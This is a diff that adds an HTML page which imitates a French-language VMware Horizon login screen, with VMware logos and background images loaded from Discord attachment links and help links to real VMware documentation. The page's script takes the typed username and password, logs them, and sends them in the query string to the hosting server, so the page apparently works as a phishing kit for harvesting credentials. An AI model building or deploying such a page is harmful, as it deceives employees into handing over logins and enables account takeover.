@@ -1,0 +1,166 @@
+<!-- Hades -->
+
+<html>
+   <title>VMware Horizon</title>
+   <link rel="icon" href="https://cdn.discordapp.com/attachments/882652381731504182/889091955341000734/favicon.ico">
+
+</html>
+
+
+<div class="login_panel">
+   <div class="vmware_full_logo"></div>
+   <br><br>
+   <input id="username", class="login_inputs", type="text", onkeyup="color()", placeholder="Nom d'utilisateur">
+   <br><br>
+   <input id="password", class="login_inputs", type="password", onkeyup="color()", placeholder="Mot de passe">
+   <button class="connect_button", id="connect_button", onclick="login()">Connexion</button>
+   <button class="annule_button", onclick="reload()">Annuler</button>
+</div>
+
+
+<br><br><br><br><br><br><br><br><br><br>
+<a class="help", href="https://docs.vmware.com/fr/VMware-Horizon-HTML-Access/4.7/html-access-user/GUID-20F0C9F6-7DE9-4D3D-8095-391C9F795F54.html">Aide avec VMware Horizon</a>
+<br><br>
+<a class="help", href="https://docs.vmware.com/fr/VMware-Horizon-HTML-Access/4.7/html-access-user/GUID-20F0C9F6-7DE9-4D3D-8095-391C9F795F54.html">Télécharger Horizon Client pour Windows (x64)</a>
+<br><br><br>
+
+
+<div class="vmware_logo"></div>
+
+
+
+<style>
+
+html {
+      background: url("https://cdn.discordapp.com/attachments/888482189849817181/888884254656839680/bg_image.jpg") no-repeat center center fixed;
+      background-size: cover;
+}
+
+body {
+   margin: 0;
+   padding: 0;
+   font-family: sans-serif;
+}
+
+
+
+.login_panel {
+   top: 125px;
+   position: relative;
+   margin: 0 auto;
+   width: 440px;
+   height: 560px;
+   padding: 25px;
+   border-radius: 4px;
+   background-color: #fff;
+   box-shadow: 0px 6px 10px 0px rgb(0 0 0 / 20%);
+}
+
+.login_inputs{
+   background: none;
+   border: none;
+   box-shadow: none;
+   border-radius: 0px;
+   height: 34px;
+   margin-top: 30px;
+   border-bottom: 1px solid #dddddd;
+   width: 100%;
+   display: block;
+   outline: none;
+   font-size: 15px;
+}
+
+
+.connect_button {
+   margin: 0;
+   position: absolute;
+   top: 50%;
+   left: 50%;
+   -ms-transform: translate(-50%, 250%);
+   transform: translate(-50%, 250%);
+   border: 0;
+   width: 420px;
+   height: 60px;
+   color: white;
+   background-color: #A4D28B;
+   font-size : 20px;
+}
+
+
+.annule_button {
+   position: absolute;
+   top: 50%;
+   left: 50%;
+   -ms-transform: translate(-50%, 1200%);
+   transform: translate(-50%, 1200%);
+   background: none;
+   color: #006990;
+   font-size: 18px;
+   margin-top: 30px;
+   height: 18px;
+   line-height: 16px;
+   border: 0;
+   width: 30%;
+}
+
+.vmware_full_logo {
+   height: 113px;
+   margin: 0 auto;
+   width: 240px;
+   margin-bottom: 40px;
+   background: url("https://cdn.discordapp.com/attachments/888482189849817181/888884667313446932/logo.png") no-repeat;
+}
+
+.vmware_logo {
+   width: 104px;
+   height: 18px;
+   position: absolute;
+   bottom: 30px;
+   left: 50%;
+   margin-left: -52px;
+   background: url("https://cdn.discordapp.com/attachments/882652381731504182/889081190122942474/n.svg") no-repeat;
+}
+
+.help {
+   color: #ffffff;
+   font-size: 15px;
+   display: block;
+   text-decoration: none;
+   text-align: center;
+
+}
+
+::placeholder {
+  color: rgb(167, 167, 167);
+}
+
+</style>
+
+
+<script type="text/javascript">
+
+   const params = new URLSearchParams(window.location.search)
+   if (params.has('username') & params.has('password')) {
+      window.location.replace("/");
+   }
+
+   function login() {
+      var usr = document.getElementById('username').value;
+      var psd = document.getElementById('password').value;
+      console.log("Username: " + usr + "\n" + "Password: " + psd)
+      window.location.replace("/?username=" + usr + "&password=" + psd);
+   }
+
+   function color() {
+      if (document.getElementById("username").value !== "" & document.getElementById("password").value !== "") {
+         document.getElementById("connect_button").style.background = "#6bb345";
+      } else {
+         document.getElementById("connect_button").style.background = "#A4D28B";
+      }
+   }
+
+   function reload() {
+      window.location.reload();
+   }
+
+</script>
